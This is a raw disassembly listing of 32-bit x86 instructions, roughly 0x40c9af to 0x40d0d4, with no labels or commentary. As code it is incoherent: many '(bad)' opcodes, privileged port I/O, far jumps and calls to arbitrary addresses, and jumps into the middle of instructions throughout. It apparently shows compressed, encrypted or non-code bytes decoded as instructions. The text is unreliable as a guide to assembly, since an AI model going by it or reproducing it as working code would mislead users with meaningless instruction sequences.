  40c9af:	mov    ebp,0xa157ca70
  40c9b4:	xor    al,0xe3
  40c9b6:	sbb    al,0xd1
  40c9b8:	inc    edx
  40c9b9:	adc    ebx,DWORD PTR [edx+0x8]
  40c9bc:	sbb    ebp,edi
  40c9be:	xor    cl,ah
  40c9c0:	in     al,dx
  40c9c1:	enter  0xad7d,0xf1
  40c9c5:	add    al,dl
  40c9c7:	mov    ds:0x973cd82f,eax
  40c9cc:	mov    ebp,0x629024df
  40c9d1:	into   
  40c9d2:	sti    
  40c9d3:	loop   0x40c9fe
  40c9d5:	or     ebp,edi
  40c9d7:	adc    DWORD PTR [esi+0x4f],eax
  40c9da:	dec    ebx
  40c9db:	pop    ss
  40c9dc:	jb     0x40c97c
  40c9de:	xchg   ecx,eax
  40c9df:	enter  0x5867,0xb0
  40c9e3:	lods   eax,DWORD PTR ds:[esi]
  40c9e4:	pop    ecx
  40c9e5:	add    ebx,edx
  40c9e7:	fisubr WORD PTR [edi+0x75c86327]
  40c9ed:	xor    ebp,DWORD PTR [ebx]
  40c9ef:	cli    
  40c9f0:	sub    BYTE PTR [eax],ch
  40c9f2:	fadd   st,st(7)
  40c9f4:	mov    al,0x72
  40c9f6:	pop    es
  40c9f7:	push   0x977e4e0e
  40c9fc:	jmp    0x40ca18
  40c9fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9ff:	mov    BYTE PTR [esi-0x4e],0x38
  40ca03:	jl     0x40c992
  40ca05:	fistp  QWORD PTR [ebx-0x1c]
  40ca08:	or     bh,dh
  40ca0a:	push   0xfffffff2
  40ca0c:	add    bh,dh
  40ca0e:	repz push ds
  40ca10:	ficom  DWORD PTR [ebp-0x3ed6d8dc]
  40ca16:	dec    esp
  40ca17:	(bad)  
  40ca18:	in     al,dx
  40ca19:	mov    bl,0xf1
  40ca1b:	enter  0xc54d,0x74
  40ca1f:	div    cl
  40ca21:	popf   
  40ca22:	outs   dx,BYTE PTR ds:[esi]
  40ca23:	sbb    al,0xee
  40ca25:	mov    bl,BYTE PTR [edi+0x8c8e997]
  40ca2b:	cld    
  40ca2c:	lock or BYTE PTR [edx-0x77],bh
  40ca30:	add    cl,BYTE PTR [esi+0x7d]
  40ca33:	and    bl,BYTE PTR [esi+0x64]
  40ca36:	in     eax,dx
  40ca37:	cmp    al,0xfa
  40ca39:	jbe    0x40ca38
  40ca3b:	fldcw  WORD PTR [ebx]
  40ca3d:	pusha  
  40ca3e:	ror    BYTE PTR [esi-0x3748ed45],0xb
  40ca45:	or     al,BYTE PTR [ebx+0x74]
  40ca48:	int    0xa5
  40ca4a:	dec    ecx
  40ca4b:	paddsb mm3,QWORD PTR [ebx-0x10f000b3]
  40ca52:	xor    al,0x1
  40ca54:	retf   
  40ca55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca56:	adc    al,cl
  40ca58:	out    dx,al
  40ca59:	sar    BYTE PTR [eax],1
  40ca5b:	pop    ecx
  40ca5c:	je     0x40cac7
  40ca5e:	iret   
  40ca5f:	rol    edi,cl
  40ca61:	daa    
  40ca62:	and    edi,DWORD PTR [edx+ebp*8]
  40ca65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca66:	test   eax,0x772f296c
  40ca6b:	and    DWORD PTR [eax-0x5efb4f18],eax
  40ca71:	jmp    0x81be926f
  40ca76:	cmc    
  40ca77:	ja     0x40ca62
  40ca79:	add    al,0x5
  40ca7b:	mov    edi,0x6984c46e
  40ca80:	sbb    dh,0xa1
  40ca83:	daa    
  40ca84:	nop
  40ca85:	jnp    0x40ca28
  40ca87:	cmp    BYTE PTR [eax],cl
  40ca89:	dec    edi
  40ca8a:	or     eax,0x4b82e780
  40ca8f:	dec    ecx
  40ca90:	pop    ecx
  40ca91:	xor    BYTE PTR [esi-0x2f92bc37],bh
  40ca97:	add    BYTE PTR [edi+0x4b],al
  40ca9a:	mov    dl,0xc8
  40ca9c:	lods   eax,DWORD PTR ds:[esi]
  40ca9d:	in     al,dx
  40ca9e:	scas   al,BYTE PTR es:[edi]
  40ca9f:	mov    edi,0xc000563e
  40caa4:	jmp    0x40ca54
  40caa6:	inc    eax
  40caa7:	and    eax,0x356c37ac
  40caac:	neg    bh
  40caae:	sbb    DWORD PTR [ebp+0x5dfe63cc],edi
  40cab4:	mov    bh,0x59
  40cab6:	sub    eax,DWORD PTR [edi+0x1b]
  40cab9:	fdivr  st,st(4)
  40cabb:	mov    al,ds:0x134df75e
  40cac0:	mov    esi,0x35c88791
  40cac5:	popa   
  40cac6:	push   esi
  40cac7:	mov    ebp,DWORD PTR [esi-0x55]
  40caca:	inc    edi
  40cacb:	mov    ch,0xed
  40cacd:	out    0x94,eax
  40cacf:	adc    ecx,esi
  40cad1:	pop    ds
  40cad2:	inc    esp
  40cad3:	fisttp WORD PTR [edi-0x4f223ebc]
  40cad9:	sar    ah,1
  40cadb:	pop    ecx
  40cadc:	fnstsw WORD PTR [eax-0x7d]
  40cadf:	xor    BYTE PTR [ebx],cl
  40cae1:	sbb    ebp,DWORD PTR [ebp-0x6d]
  40cae4:	add    eax,0xece925d8
  40cae9:	mov    ah,0x8e
  40caeb:	lods   eax,DWORD PTR ds:[esi]
  40caec:	inc    ebx
  40caed:	dec    ecx
  40caee:	call   0xcf1b66bb
  40caf3:	leave  
  40caf4:	call   0x8e0b8222
  40caf9:	test   DWORD PTR [ebx+0x30],ebp
  40cafc:	inc    edi
  40cafd:	imul   edi,ebp,0x1a6a6e96
  40cb03:	mov    ecx,0xc87fa4e3
  40cb08:	or     BYTE PTR [esp+ebx*2+0x777844ea],ch
  40cb0f:	(bad)  
  40cb11:	sbb    bl,BYTE PTR [edi-0x35]
  40cb14:	xchg   ebp,eax
  40cb15:	mov    dh,0x12
  40cb17:	jge    0x40cb53
  40cb19:	aas    
  40cb1a:	es pop ebp
  40cb1c:	das    
  40cb1d:	ficomp WORD PTR [ebp+0x33d9e043]
  40cb23:	push   ds
  40cb24:	and    ebx,DWORD PTR [edi-0x73d85f75]
  40cb2a:	std    
  40cb2b:	pop    edi
  40cb2c:	push   eax
  40cb2d:	xor    al,0x16
  40cb2f:	sub    BYTE PTR [edx+0x17],ch
  40cb32:	bswap  edx
  40cb34:	call   0x7503eb7d
  40cb39:	adc    al,0x1e
  40cb3b:	and    BYTE PTR [ebp+0x37],al
  40cb3e:	retf   0xec47
  40cb41:	dec    ebx
  40cb42:	pop    ebp
  40cb43:	adc    bh,bl
  40cb45:	iret   
  40cb46:	adc    DWORD PTR [esi+0x43],edi
  40cb49:	cwde   
  40cb4a:	cdq    
  40cb4b:	lock mov ebp,cs
  40cb4e:	push   esp
  40cb4f:	leave  
  40cb50:	pop    eax
  40cb51:	fisubr DWORD PTR [ebx-0x129e17b2]
  40cb57:	jmp    FWORD PTR [edx+eiz*2-0x2040131c]
  40cb5e:	mov    eax,ds:0x97bc2fe5
  40cb63:	mov    ecx,0x2841e7fd
  40cb68:	or     al,0xcf
  40cb6a:	lods   al,BYTE PTR ds:[esi]
  40cb6b:	clc    
  40cb6c:	in     eax,dx
  40cb6d:	cmp    eax,0xff11ae84
  40cb72:	or     ch,bh
  40cb74:	adc    DWORD PTR [edi+0x46],0xffffffe1
  40cb78:	mov    bh,0xd4
  40cb7a:	push   DWORD PTR [edi+0x1fb1ba56]
  40cb80:	push   ecx
  40cb81:	fstp   QWORD PTR [ebp+ebx*8-0x3c0311fe]
  40cb88:	cmc    
  40cb89:	std    
  40cb8a:	repz cwde 
  40cb8c:	xchg   DWORD PTR [esi-0x39ed38f7],edi
  40cb92:	inc    esi
  40cb93:	ror    edi,0x1f
  40cb96:	sbb    dl,bh
  40cb98:	dec    ebp
  40cb99:	sar    bh,1
  40cb9b:	sti    
  40cb9c:	loope  0x40cbe1
  40cb9e:	jnp    0x40cb4b
  40cba0:	push   esi
  40cba1:	aaa    
  40cba2:	fidivr WORD PTR [ebx-0xcf2208f]
  40cba8:	and    cl,BYTE PTR [edi]
  40cbaa:	adc    DWORD PTR [ebx+0x2d],edx
  40cbad:	inc    edx
  40cbae:	inc    BYTE PTR [esi]
  40cbb0:	push   ds
  40cbb1:	mov    ah,0x43
  40cbb3:	iret   
  40cbb4:	jae    0x40cc1c
  40cbb6:	in     eax,dx
  40cbb7:	(bad)  
  40cbb8:	mov    eax,ds:0xd7c7e7c4
  40cbbd:	hlt    
  40cbbe:	frstor [ebp-0x27]
  40cbc1:	push   esp
  40cbc2:	sbb    al,0x40
  40cbc4:	jmp    0x40cb60
  40cbc6:	int3   
  40cbc7:	lahf   
  40cbc8:	outs   dx,DWORD PTR ds:[esi]
  40cbc9:	sbb    esp,esi
  40cbcb:	ins    BYTE PTR es:[edi],dx
  40cbcc:	pop    ds
  40cbcd:	fsub   QWORD PTR [ecx+eax*8+0x29]
  40cbd1:	(bad)  
  40cbd2:	test   BYTE PTR [eax],0x53
  40cbd5:	mov    WORD PTR [ecx+0x5a],ds
  40cbd8:	jmp    0x40cbb3
  40cbda:	push   eax
  40cbdb:	adc    DWORD PTR ds:0xbbf93c67,ebx
  40cbe1:	loopne 0x40cba8
  40cbe3:	ds mov ah,0x6e
  40cbe6:	mov    ecx,0xace1d5a8
  40cbeb:	lods   al,BYTE PTR ds:[esi]
  40cbec:	popf   
  40cbed:	clc    
  40cbee:	add    DWORD PTR [ebx+ebp*1-0x2e],ebp
  40cbf2:	jl     0x40cc6b
  40cbf4:	xchg   esp,eax
  40cbf5:	in     eax,0x57
  40cbf7:	hlt    
  40cbf8:	mov    eax,0x2c56a4de
  40cbfd:	sbb    al,0x7c
  40cbff:	pushf  
  40cc00:	xor    edx,DWORD PTR [ebx-0x15]
  40cc03:	adc    al,0xbf
  40cc05:	adc    eax,0x5d63c89f
  40cc0a:	out    0x80,al
  40cc0c:	fistp  WORD PTR [edi+0x7628be07]
  40cc12:	pop    ebx
  40cc13:	enter  0xd06f,0x7a
  40cc17:	mov    ds:0xdfd1a8d,al
  40cc1c:	jle    0x40cbbb
  40cc1e:	mov    ds:0x3820c078,al
  40cc23:	(bad)  
  40cc24:	(bad)  
  40cc25:	jle    0x40cc07
  40cc27:	push   ss
  40cc28:	shr    DWORD PTR [ebx+0x287f6401],0x7d
  40cc2f:	pop    edi
  40cc30:	dec    ecx
  40cc31:	add    eax,edx
  40cc33:	and    DWORD PTR [ebp+0x5459d4df],esp
  40cc39:	pop    eax
  40cc3a:	test   al,0xf7
  40cc3c:	dec    ebx
  40cc3d:	(bad)  
  40cc3f:	aas    
  40cc40:	mov    DWORD PTR [esi+0x3d],ebx
  40cc43:	fwait
  40cc44:	and    BYTE PTR [eax+0x5111c7f2],0x2a
  40cc4b:	xchg   esp,eax
  40cc4c:	les    ebx,FWORD PTR [edi-0x79]
  40cc4f:	push   ebp
  40cc50:	jmp    0x40cc97
  40cc52:	bound  edi,QWORD PTR [eax-0x763ff644]
  40cc58:	pop    ebx
  40cc59:	jmp    0xcc09:0xdff551dc
  40cc60:	mov    esp,DWORD PTR [eax+0x2a]
  40cc63:	adc    eax,0xe53907eb
  40cc68:	pandn  mm5,QWORD PTR es:[edx+0x13]
  40cc6d:	imul   esi
  40cc6f:	hlt    
  40cc70:	(bad)  
  40cc71:	les    edi,FWORD PTR [edi]
  40cc73:	enter  0xb98c,0xd
  40cc77:	inc    eax
  40cc78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc79:	xchg   BYTE PTR [edx-0x7a3614f5],ah
  40cc7f:	cs addr16 xor eax,0xdf71b369
  40cc86:	pop    ds
  40cc87:	sar    DWORD PTR [edi],cl
  40cc89:	jge    0xfd317781
  40cc8f:	sub    esp,esp
  40cc91:	in     al,dx
  40cc92:	mov    ds:0x81f4e514,eax
  40cc97:	enter  0xb4dd,0xc9
  40cc9b:	cmovb  ebx,DWORD PTR [ecx-0x65]
  40cc9f:	xchg   ecx,eax
  40cca0:	or     eax,0xf4e7933d
  40cca5:	add    DWORD PTR [ebx],eax
  40cca7:	push   0x71745f56
  40ccac:	mov    ds:0x1c8c4e2,al
  40ccb1:	push   ss
  40ccb2:	push   ebx
  40ccb3:	std    
  40ccb4:	in     eax,0x23
  40ccb6:	dec    edi
  40ccb7:	jae    0x40cc98
  40ccb9:	fld    QWORD PTR [esi-0x25b127b8]
  40ccbf:	das    
  40ccc0:	(bad)  
  40ccc1:	pop    ebx
  40ccc2:	xchg   ecx,eax
  40ccc3:	enter  0xc11a,0xd
  40ccc7:	push   es
  40ccc8:	mov    edi,0xeeedfe48
  40cccd:	push   es
  40ccce:	mov    ah,bh
  40ccd0:	mov    DWORD PTR [edi],edi
  40ccd2:	sub    BYTE PTR [edx],dl
  40ccd4:	cdq    
  40ccd5:	add    al,0xa7
  40ccd7:	enter  0x6fae,0x68
  40ccdb:	(bad)  
  40ccdc:	dec    ecx
  40ccdd:	icebp  
  40ccde:	inc    ecx
  40ccdf:	xor    ch,bl
  40cce1:	xchg   ebp,eax
  40cce2:	(bad)  
  40cce3:	stos   BYTE PTR es:[edi],al
  40cce4:	xchg   bl,bl
  40cce6:	mov    bl,0x27
  40cce8:	(bad)  
  40cce9:	fist   WORD PTR [eax]
  40cceb:	imul   edi,DWORD PTR [edx+0x4f],0x68
  40ccef:	jns    0x40cd37
  40ccf1:	arpl   bp,di
  40ccf3:	or     ecx,ecx
  40ccf5:	pop    esp
  40ccf6:	xlat   BYTE PTR ds:[ebx]
  40ccf8:	fs xor ah,al
  40ccfb:	retf   0xa768
  40ccfe:	int3   
  40ccff:	mov    esp,0x166d17b4
  40cd04:	inc    esi
  40cd05:	repnz cld 
  40cd07:	adc    BYTE PTR [ecx-0x3818b245],dh
  40cd0d:	inc    ebx
  40cd0e:	cs enter 0x5402,0xaa
  40cd13:	xor    al,0xef
  40cd15:	je     0x40cd58
  40cd17:	mov    cl,0xb3
  40cd19:	xlat   BYTE PTR ds:[ebx]
  40cd1a:	xchg   edi,eax
  40cd1b:	enter  0x2b16,0xc0
  40cd1f:	aad    0xba
  40cd21:	mov    esp,0x8b8bc9b1
  40cd26:	fisubr WORD PTR [edx-0x7b]
  40cd29:	mov    ebp,0xe65d3068
  40cd2e:	sub    DWORD PTR [eax],ecx
  40cd30:	in     al,dx
  40cd31:	outs   dx,DWORD PTR ds:[esi]
  40cd32:	xchg   BYTE PTR [ebx+0x10a385c7],ah
  40cd38:	and    edi,esp
  40cd3a:	cmp    eax,ecx
  40cd3c:	xchg   ecx,eax
  40cd3d:	es mov bl,0x64
  40cd40:	mov    ebx,0xe080c946
  40cd45:	add    dh,BYTE PTR [eax+0x47]
  40cd48:	sub    DWORD PTR [esi+0x565b413c],ecx
  40cd4e:	cs mov eax,0x83d8df3a
  40cd54:	in     eax,dx
  40cd55:	retf   0xa101
  40cd58:	pop    ecx
  40cd59:	mov    cl,0xfc
  40cd5b:	outs   dx,BYTE PTR ds:[esi]
  40cd5c:	pop    ss
  40cd5d:	ds js  0x40cd58
  40cd60:	cmp    eax,0x30a0d20d
  40cd65:	fbld   TBYTE PTR [eax]
  40cd67:	sub    cl,BYTE PTR ds:0x33bf5fa2
  40cd6d:	fucom  st(7)
  40cd6f:	jmp    0x40cd70
  40cd71:	pop    esi
  40cd72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd73:	xor    DWORD PTR [eax-0x23cf53e5],esi
  40cd79:	stos   BYTE PTR es:[edi],al
  40cd7a:	xchg   esp,eax
  40cd7b:	adc    eax,0xe957df24
  40cd80:	sahf   
  40cd81:	cmp    ah,BYTE PTR [esi]
  40cd83:	in     al,dx
  40cd84:	jns    0x40cd7e
  40cd86:	loope  0x40cd42
  40cd88:	xchg   edi,eax
  40cd89:	(bad)  
  40cd8b:	jg     0x40cd8d
  40cd8d:	js     0x40cd42
  40cd8f:	inc    ecx
  40cd90:	neg    esp
  40cd92:	es mov ss,WORD PTR es:0x671b2c01
  40cd9a:	cli    
  40cd9b:	mov    dl,0xed
  40cd9d:	cld    
  40cd9e:	sar    cl,0x94
  40cda1:	lahf   
  40cda2:	in     eax,dx
  40cda3:	xor    al,0x93
  40cda5:	ins    BYTE PTR es:[edi],dx
  40cda6:	push   eax
  40cda7:	enter  0x29b8,0x5c
  40cdab:	pop    ss
  40cdac:	and    ebx,DWORD PTR [edx-0x6f15a230]
  40cdb2:	lods   eax,DWORD PTR ds:[esi]
  40cdb3:	test   al,0xe8
  40cdb5:	out    dx,al
  40cdb6:	icebp  
  40cdb7:	pop    ds
  40cdb8:	int    0xa2
  40cdba:	inc    edx
  40cdbb:	enter  0x7d3d,0x46
  40cdbf:	lock aad 0x61
  40cdc2:	dec    esp
  40cdc3:	imul   edi,esi,0x63
  40cdc6:	nop
  40cdc7:	push   edi
  40cdc8:	imul   eax,DWORD PTR [edi-0x14],0xffffffc3
  40cdcc:	xchg   esi,eax
  40cdcd:	andps  xmm1,xmm0
  40cdd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd2:	in     eax,0xd1
  40cdd4:	shl    DWORD PTR [esi+0x79eb1ad9],cl
  40cdda:	fadd   st(1),st
  40cddc:	aam    0x2e
  40cdde:	sti    
  40cddf:	jns    0x40ce42
  40cde1:	fistp  QWORD PTR [ecx]
  40cde3:	or     bh,dl
  40cde5:	inc    eax
  40cde6:	adc    eax,0xfd4302dd
  40cdeb:	cmp    eax,0x50d1d6a7
  40cdf0:	inc    ebp
  40cdf1:	pop    ebx
  40cdf2:	sbb    eax,ecx
  40cdf4:	fsub   DWORD PTR [esi+edi*1-0x15]
  40cdf8:	ret    
  40cdf9:	(bad)  
  40cdfa:	mov    fs,WORD PTR [edx-0x17]
  40cdfd:	dec    edx
  40cdfe:	push   0x199448e8
  40ce03:	test   eax,0x8fa4b8d0
  40ce08:	dec    esp
  40ce09:	inc    ebx
  40ce0a:	(bad)
  40ce0e:	shr    BYTE PTR [eax],cl
  40ce10:	std    
  40ce11:	bound  eax,QWORD PTR [ecx]
  40ce13:	dec    ecx
  40ce14:	jmp    0x40ce79
  40ce16:	jmp    0xf94f:0xb25fa02e
  40ce1d:	fcomip st,st(6)
  40ce1f:	cmp    bh,BYTE PTR [ebx]
  40ce21:	mov    dh,0x41
  40ce23:	lea    edx,[esi]
  40ce25:	sub    eax,0x86aeb4fd
  40ce2a:	mul    BYTE PTR [ecx]
  40ce2c:	sub    DWORD PTR [ecx+0x36a6ceb4],ecx
  40ce32:	xchg   esp,eax
  40ce33:	dec    esi
  40ce34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce35:	xchg   esi,eax
  40ce36:	in     eax,dx
  40ce37:	daa    
  40ce38:	gs pop es
  40ce3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce3b:	mov    ebx,0xa3311feb
  40ce40:	xchg   ecx,esp
  40ce42:	imul   esi,edi,0x4e3d689b
  40ce48:	mov    edi,0x836cfefd
  40ce4d:	and    ebp,DWORD PTR [eax-0x2fa3e22e]
  40ce53:	sbb    al,0xbe
  40ce55:	das    
  40ce56:	inc    edi
  40ce57:	and    BYTE PTR [ecx],bl
  40ce59:	ds out dx,al
  40ce5b:	push   ecx
  40ce5c:	adc    esi,DWORD PTR [eax-0xb2c42e2]
  40ce62:	inc    edx
  40ce63:	dec    eax
  40ce64:	out    dx,eax
  40ce65:	lds    ebx,FWORD PTR [edx]
  40ce67:	sbb    edx,DWORD PTR [ebx]
  40ce69:	(bad)  
  40ce6b:	push   edi
  40ce6c:	outs   dx,BYTE PTR ds:[esi]
  40ce6d:	fisubr DWORD PTR [eax+0x57]
  40ce70:	iret   
  40ce71:	in     eax,dx
  40ce72:	pop    edx
  40ce73:	enter  0x1958,0x48
  40ce77:	int3   
  40ce78:	leave  
  40ce79:	add    ch,BYTE PTR [ebx-0x6a]
  40ce7c:	jmp    0x40ce6e
  40ce7e:	sbb    DWORD PTR [ebp-0x7b33052c],0xffffff8d
  40ce85:	fild   WORD PTR [edx-0x30]
  40ce88:	and    eax,0xcccae40c
  40ce8d:	stos   BYTE PTR es:[edi],al
  40ce8e:	std    
  40ce8f:	jbe    0x40cea9
  40ce91:	call   esi
  40ce93:	jo     0x40cef4
  40ce95:	fsub   DWORD PTR [eax-0x31801e8b]
  40ce9b:	ins    DWORD PTR es:[edi],dx
  40ce9c:	(bad)  
  40ce9d:	int    0x6d
  40ce9f:	enter  0xbcb1,0xd0
  40cea3:	sub    ebx,DWORD PTR [edi]
  40cea5:	push   ebx
  40cea6:	gs xchg ecx,eax
  40cea8:	jmp    0x40ce87
  40ceaa:	jmp    0x3b73c17e
  40ceaf:	push   es
  40ceb0:	leave  
  40ceb1:	fbld   TBYTE PTR [esi+0xa9ee693]
  40ceb7:	in     eax,dx
  40ceb8:	inc    ebp
  40ceb9:	int    0xfc
  40cebb:	jmp    0x40cef2
  40cebd:	mov    ecx,0x47dd1c71
  40cec2:	popa   
  40cec3:	mov    esp,0x87629a29
  40cec8:	(bad)  
  40cec9:	popa   
  40ceca:	aad    0xb7
  40cecc:	sbb    ebp,DWORD PTR [ecx-0x3b]
  40cecf:	loopne 0x40ceda
  40ced1:	xchg   ecx,eax
  40ced2:	jecxz  0x40cf18
  40ced4:	sbb    edi,0x963e16ea
  40ceda:	push   es
  40cedb:	rol    DWORD PTR [esi-0x27],0x36
  40cedf:	rcr    BYTE PTR [eax],0x5c
  40cee2:	mov    ebp,0xc2baaf49
  40cee7:	cmp    ch,bl
  40cee9:	push   cs
  40ceea:	mov    esp,0x57762fa8
  40ceef:	xlat   BYTE PTR ds:[ebx]
  40cef0:	int    0xdc
  40cef2:	mov    bh,0x70
  40cef4:	lea    esp,[edx+0x0]
  40cef7:	pop    ss
  40cef8:	or     eax,DWORD PTR [edx-0x4b]
  40cefb:	inc    ebx
  40cefc:	jmp    0x40cea6
  40cefe:	sub    ebx,DWORD PTR [edx+ebx*1+0xcbe6e32]
  40cf05:	push   ecx
  40cf06:	jle    0x40ced0
  40cf08:	and    eax,0x5b08a5f1
  40cf0d:	aam    0x7c
  40cf0f:	inc    eax
  40cf10:	xchg   edi,eax
  40cf11:	pop    eax
  40cf12:	hlt    
  40cf13:	cdq    
  40cf14:	xchg   ebp,eax
  40cf15:	mov    fs,WORD PTR [edi-0x78]
  40cf18:	scas   eax,DWORD PTR es:[edi]
  40cf19:	out    dx,eax
  40cf1a:	push   ebx
  40cf1b:	in     eax,0x34
  40cf1d:	fcom   QWORD PTR [ecx]
  40cf1f:	pop    esi
  40cf20:	jl     0x40cf93
  40cf22:	mov    esp,0xfdc263b9
  40cf27:	int    0xb2
  40cf29:	pop    edi
  40cf2a:	popf   
  40cf2b:	or     DWORD PTR [ebp+0x229128dc],edx
  40cf31:	xor    DWORD PTR [eax],ecx
  40cf33:	(bad)  
  40cf34:	cmp    ebx,DWORD PTR [eax]
  40cf36:	jmp    0x40cec7
  40cf38:	iret   
  40cf39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf3a:	repnz test ebx,ebp
  40cf3d:	sbb    al,0x83
  40cf3f:	jb     0x40cf3f
  40cf41:	sub    cl,al
  40cf43:	enter  0x5379,0x72
  40cf47:	xor    eax,0x316c5935
  40cf4c:	jmp    0x40cf76
  40cf4e:	scas   al,BYTE PTR es:[edi]
  40cf4f:	cmp    BYTE PTR [ebp-0x4],al
  40cf52:	jnp    0x40cedb
  40cf54:	sub    ch,bl
  40cf56:	(bad)  
  40cf57:	mov    esp,0x3e0cbc94
  40cf5c:	imul   ecx,DWORD PTR [edx-0x5ba74ba2],0xffffffff
  40cf63:	(bad)  
  40cf64:	push   ebx
  40cf65:	daa    
  40cf66:	aad    0xcf
  40cf68:	lea    esi,[esi+0x7]
  40cf6b:	lea    edx,[ebx]
  40cf6d:	jb     0x40cf7a
  40cf6f:	retf   
  40cf70:	pop    esp
  40cf71:	pop    edx
  40cf72:	cmp    al,0x1f
  40cf74:	fs jns 0x40cfdc
  40cf77:	xchg   ebx,eax
  40cf78:	int3   
  40cf79:	add    ebp,edi
  40cf7b:	or     al,0xbe
  40cf7d:	sbb    ebp,DWORD PTR [eax+ebp*4]
  40cf80:	xchg   DWORD PTR [ebx+0x57],eax
  40cf83:	enter  0x1e7d,0xd
  40cf87:	mov    esi,0x872677c2
  40cf8c:	jmp    0x40cf24
  40cf8e:	imul   edx,edx,0x28
  40cf91:	out    0x40,eax
  40cf93:	js     0x40cf76
  40cf95:	xchg   DWORD PTR [ecx-0x7020426a],ebx
  40cf9b:	dec    ebx
  40cf9c:	mov    ebp,ecx
  40cf9e:	bound  eax,QWORD PTR [edx-0x7]
  40cfa1:	inc    ebx
  40cfa2:	(bad)  
  40cfa3:	adc    eax,0xe6942fb5
  40cfa8:	push   ds
  40cfa9:	out    0x24,al
  40cfab:	push   ecx
  40cfac:	jmp    0x40cfb5
  40cfae:	jmp    DWORD PTR [ecx+0x45fae47e]
  40cfb4:	(bad)  
  40cfb5:	fwait
  40cfb6:	push   edx
  40cfb7:	or     al,0xeb
  40cfb9:	mov    eax,0xef6e38b
  40cfbe:	(bad)
  40cfc2:	out    dx,eax
  40cfc3:	sahf   
  40cfc4:	jg     0x40d015
  40cfc6:	xchg   esi,eax
  40cfc7:	pop    ss
  40cfc8:	jmp    0x40cf6c
  40cfca:	stos   BYTE PTR es:[edi],al
  40cfcb:	mov    edx,0x8e00fa80
  40cfd0:	and    al,0xc6
  40cfd2:	xor    BYTE PTR [esi-0x37df3275],0xa6
  40cfd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfda:	mov    BYTE PTR [ebx-0x26028157],dl
  40cfe0:	mov    edi,?
  40cfe2:	add    BYTE PTR [ebx-0x1eb5fce6],ch
  40cfe8:	in     al,0x11
  40cfea:	add    DWORD PTR [eax-0x35],0x5f
  40cfee:	cmp    BYTE PTR [eax+0x43b1871d],ch
  40cff4:	jmp    0x4f95:0x1668beb0
  40cffb:	clc    
  40cffc:	fldenv [ecx+0x3ce1c726]
  40d002:	push   0x9ddfff4f
  40d007:	sbb    edi,esi
  40d009:	pop    esi
  40d00a:	inc    ebp
  40d00b:	popf   
  40d00c:	pop    esi
  40d00d:	(bad)  
  40d00f:	xchg   DWORD PTR [edx-0x41],ebp
  40d012:	sbb    dh,ah
  40d014:	push   cs
  40d015:	call   0x353b:0x5453c845
  40d01c:	mov    esp,0xecb85a23
  40d021:	test   al,0xeb
  40d023:	fidiv  WORD PTR [edi+ecx*1+0x66]
  40d027:	mov    dl,0xdb
  40d029:	repnz mov eax,cs
  40d02c:	push   cs
  40d02d:	rcl    DWORD PTR ds:0xc9063585,cl
  40d033:	inc    edi
  40d034:	jmp    0x40d04b
  40d036:	les    esi,FWORD PTR [ecx+eax*4]
  40d039:	cmp    ebp,eax
  40d03b:	(bad)  
  40d03c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d03d:	fild   WORD PTR [esi]
  40d03f:	xchg   BYTE PTR [eax+0x14b52b90],dl
  40d045:	pop    ebp
  40d046:	std    
  40d047:	sbb    cl,0x87
  40d04a:	mov    ch,0xdc
  40d04c:	mov    ebx,DWORD PTR [ebx+0x1]
  40d04f:	enter  0xf767,0x51
  40d053:	js     0x40d065
  40d055:	mov    ecx,DWORD PTR [edx+0x52]
  40d058:	hlt    
  40d059:	sar    DWORD PTR [ebx+0x50df65ca],cl
  40d05f:	lods   al,BYTE PTR ds:[esi]
  40d060:	inc    edx
  40d061:	and    edx,ebx
  40d063:	(bad)  
  40d064:	xor    BYTE PTR [ecx+0x52],dl
  40d067:	xchg   edi,eax
  40d068:	push   ecx
  40d069:	outs   dx,DWORD PTR ds:[esi]
  40d06a:	(bad)  
  40d06b:	jae    0x40d031
  40d06d:	xor    al,BYTE PTR [edx+edx*8]
  40d070:	xor    al,ch
  40d072:	cmp    al,0xd6
  40d074:	test   edx,ebp
  40d076:	xchg   esp,eax
  40d077:	mov    cl,0x93
  40d079:	or     BYTE PTR [ebp-0x4a],al
  40d07c:	imul   ebp,ebp,0xffffffdb
  40d07f:	aas    
  40d080:	mov    ebx,0xeb4b9601
  40d085:	loop   0x40d04a
  40d087:	mov    DWORD PTR [edi],ebp
  40d089:	lods   al,BYTE PTR ds:[esi]
  40d08a:	and    BYTE PTR [edx-0x1d],al
  40d08d:	fist   WORD PTR [eax+eiz*2]
  40d090:	push   esp
  40d091:	out    dx,al
  40d092:	mov    bh,0x20
  40d094:	lock outs dx,DWORD PTR ds:[esi]
  40d096:	std    
  40d097:	push   eax
  40d098:	mov    DWORD PTR [ecx+0x6a],eax
  40d09b:	pop    es
  40d09c:	cmp    cl,BYTE PTR [ecx]
  40d09e:	cmp    cl,al
  40d0a0:	(bad)  
  40d0a1:	je     0x40d0e5
  40d0a3:	xchg   edi,eax
  40d0a4:	push   edi
  40d0a5:	sbb    ah,0x18
  40d0a8:	and    DWORD PTR [eax-0x3],ebp
  40d0ab:	or     DWORD PTR [ecx],eax
  40d0ad:	mov    WORD PTR [esi+ecx*8+0x24],cs
  40d0b1:	dec    edx
  40d0b2:	or     ecx,eax
  40d0b4:	xor    al,0x9e
  40d0b6:	daa    
  40d0b7:	cmp    dh,bh
  40d0b9:	push   cs
  40d0ba:	inc    ecx
  40d0bb:	retf   
  40d0bc:	in     eax,dx
  40d0bd:	shl    BYTE PTR [esi-0x1ba74f65],0x7
  40d0c4:	push   ebx
  40d0c5:	add    edi,eax
  40d0c7:	or     cl,cl
  40d0c9:	fidivr WORD PTR [eax-0x49]
  40d0cc:	adc    eax,0x55d69df9
  40d0d1:	pop    ss
  40d0d2:	mov    DWORD PTR [edi],edx
  40d0d4:	jmp    0x8ed5:0x34d563ac
